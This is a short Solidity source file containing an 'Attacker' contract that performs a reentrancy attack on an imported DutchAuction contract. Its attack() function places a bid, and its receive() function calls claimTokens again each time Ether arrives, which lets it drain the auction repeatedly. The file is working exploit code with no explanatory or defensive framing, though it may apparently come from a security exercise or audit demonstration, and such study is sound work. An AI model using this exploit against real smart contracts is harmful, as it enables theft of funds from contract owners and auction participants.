// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./DutchAuction.sol"; // Import the DutchAuction contract to attack.

contract Attacker {
    DutchAuction public auctionContract;
    event Received(address, uint);
    
    uint public total;
    constructor(address payable _auctionContract) {
        auctionContract = DutchAuction(_auctionContract);
    }

    // Function to perform the reentrancy attack
    function attack() payable public {
        // Call the bid function on the DutchAuction contract to participate in the auction.
        auctionContract.bid{ value: msg.value }(address(this));
    }

    function claimTokens() public{
        auctionContract.claimTokens(address(this));
    }

    receive() external payable {
        // Perform reentrancy attack again by calling claimTokens again
        auctionContract.claimTokens(address(this));
        // emit Received(msg.sender, msg.value);
    }

    fallback() external payable {
    }
}